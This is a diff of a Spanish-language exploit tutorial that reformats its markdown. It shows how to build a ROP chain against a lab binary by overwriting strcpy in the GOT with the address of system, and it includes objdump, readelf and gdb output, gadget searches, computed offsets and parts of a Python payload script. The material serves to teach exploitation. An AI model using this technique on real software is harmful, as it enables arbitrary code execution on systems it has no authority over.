@@ -170,7 +170,7 @@ print payload
 # Fin fichero python
 ```
 	
-### ATACANDO EL GOT ### 
+### ATACANDO EL GOT
 
 Todo lo anterior está muy bien, pero si no tenemos una sección no randomizable tenemos un problema.
 
@@ -265,7 +265,7 @@ objdump -M intel -drw ./stack1 | grep strcpy -b3
 6610- 804849f:	89 04 24             	mov    DWORD PTR [esp],eax
 6669: 80484a2:	e8 c1 fe ff ff       	call   8048368 <strcpy@plt>
 ```
-- Valores que debemos calcular para preparar el exploit:
+Valores que debemos calcular para preparar el exploit:
 
 a) Saber el valor de "strcpy" en GOT, como vemos más arriba de PLT se llama a la función en GOT haciendo un "jmp DWORD PTR ds:0x8049710":
 ```
@@ -284,7 +284,7 @@ b) Hallar el valor del offset, para ello podemos hacerlo de dos maneras:
 	0003ab30 g    DF .text	00000037  GLIBC_PRIVATE __libc_system
 	0003ab30  w   DF .text	00000037  GLIBC_2.0   system
 ```
-Offset system-strcpy: 0003ab30-00075580 = 0xfffc55b0
+	Offset system-strcpy: 0003ab30-00075580 = 0xfffc55b0
 		
 - Directamente en gdb:
 ```
@@ -303,14 +303,14 @@ c) Hallar posición de memoria donde podamos guardar el offset calculado anterio
   readelf -S stack1 | grep "\.data"
   [24] .data             PROGBITS        08049720 000720 000008 00  WA  0   0  4
 ```
--Recopilando, ya tenemos los 3 valores para armar el exploit:
+Recopilando, ya tenemos los 3 valores para armar el exploit:
 ```
 strcpy@GOT: 0x8049710
 Offset system-strcpy: 0xfffb3840
 data: 0x08049720
 ```
 
-- Los pasos a seguir para construir el exploit serán los siguientes:
+Los pasos a seguir para construir el exploit serán los siguientes:
 
 1) Para guardar el offset en una posicion de memoria que tenga permisos de escritura necesitaremos:
 	- Instrucciones de ensamblador que nos guarde en un registro el valor donde vamos a guardar en memoria el offset (pop $reg)
@@ -324,7 +324,7 @@ data: 0x08049720
 	- Instrucciones de llamada: call reg1
 
 
-- Ahora es cuando empieza la búsqueda de "gadgets" (Eh la qui va là). Lógicamente lo que encontremos no va a coincidir exactamente con lo que necesitemos, pero podremos adaptarlo para que, con unas operaciones, haga lo que nosostros queremos. Para buscar estas instrucciones por las que vamos a ir saltando hasta conseguir la ejecución del exploit contamos con la ayuda de ROPeMe (https://github.com/packz/ropeme):
+Ahora es cuando empieza la búsqueda de "gadgets" (Eh la qui va là). Lógicamente lo que encontremos no va a coincidir exactamente con lo que necesitemos, pero podremos adaptarlo para que, con unas operaciones, haga lo que nosostros queremos. Para buscar estas instrucciones por las que vamos a ir saltando hasta conseguir la ejecución del exploit contamos con la ayuda de ROPeMe (https://github.com/packz/ropeme):
 
 ```
 ROPeMe> generate stack1 5
@@ -374,7 +374,7 @@ Copio y pego del estupendo blog de referencia para este ejercicio donde está ex
 La idea es utilizar el gadget (2) para escribir el offset entre system y strcpy en algún sitio con permisos de escritura, de forma que el registro EAX se quede con dicho offset. Luego, con el (4) sumar al offset que tenemos en EAX la dirección de strcpy obtenida de la GOT, teniendo en EAX un puntero a system. Por ultimo, con el (5), llamar a la función calculada."
 ```
 
-- Este sería mi script final haciendo los ajustes necesarios:
+Este sería mi script final haciendo los ajustes necesarios:
 
 ```python
 #!/usr/bin/python
@@ -428,7 +428,7 @@ payload = junk + rop
 print payload
 ```
 
-- Para comprobar que funciona el èxploit tener en cuenta que le pasamos la cadena GNU que está en una determinada posición. Para averiguar la posición:
+Para comprobar que funciona el èxploit tener en cuenta que le pasamos la cadena GNU que está en una determinada posición. Para averiguar la posición:
 ```
 gdb-peda$ searchmem GNU 
 Searching for 'GNU' in: None ranges
@@ -449,42 +449,47 @@ Como no existe hay que crear un enlace  a sh desde esa cadena y meterle en el pa
 ``` 
 
 
-El caso de cheer_msg:
+El caso de cheer_msg (otro día...)
 
 
-	El valor fijo de printf es, aquí tener en cuenta que en la segunda llamada escribe en 
-	
-	objdump -R cheer_msg | grep printf
-	0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
-	
-	Dos maneras de calcular el offset respecto a printf por ejemplo:
-	
-	a) Usando objdump:
-	
-	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system
-	0003ab30  w   DF .text	00000037  GLIBC_2.0   system
-	
-	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep printf
-	00049930 g    DF .text	0000002a  GLIBC_2.0   printf
+El valor fijo de printf es, aquí tener en cuenta que en la segunda llamada escribe en 
 
-	libc:
-	00049930 printf 
-	0003ab30 system
-	
-	offset = system-printf = FFFFFFFFFFFF1200
-	
-	b) Usando gdb:
-	
-	gdb-peda$ p system
-	$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
-	gdb-peda$ p printf
-	$2 = {<text variable, no debug info>} 0xb7e41930 <__printf>
-	gdb-peda$ p /x 0xb7e32b30-0xb7e41930
-	$3 = 0xffff1200
-	gdb-peda$ x/2i printf+0xffff1200
-	0xb7e32b30 <__libc_system>:	sub    esp,0xc
-	0xb7e32b33 <__libc_system+3>:	mov    eax,DWORD PTR [esp+0x10]
-	
+``` 
+objdump -R cheer_msg | grep printf
+0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
+``` 
+
+Dos maneras de calcular el offset respecto a printf por ejemplo:
+
+a) Usando objdump:
+``` 
+objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system
+0003ab30  w   DF .text	00000037  GLIBC_2.0   system
+
+objdump -T /lib/i386-linux-gnu/libc.so.6 | grep printf
+00049930 g    DF .text	0000002a  GLIBC_2.0   printf
+``` 
+``` 
+libc:
+00049930 printf 
+0003ab30 system
+
+offset = system-printf = FFFFFFFFFFFF1200
+``` 
+
+b) Usando gdb:
+
+``` 
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
+gdb-peda$ p printf
+$2 = {<text variable, no debug info>} 0xb7e41930 <__printf>
+gdb-peda$ p /x 0xb7e32b30-0xb7e41930
+$3 = 0xffff1200
+gdb-peda$ x/2i printf+0xffff1200
+0xb7e32b30 <__libc_system>:	sub    esp,0xc
+0xb7e32b33 <__libc_system+3>:	mov    eax,DWORD PTR [esp+0x10]
+``` 
 
 
 
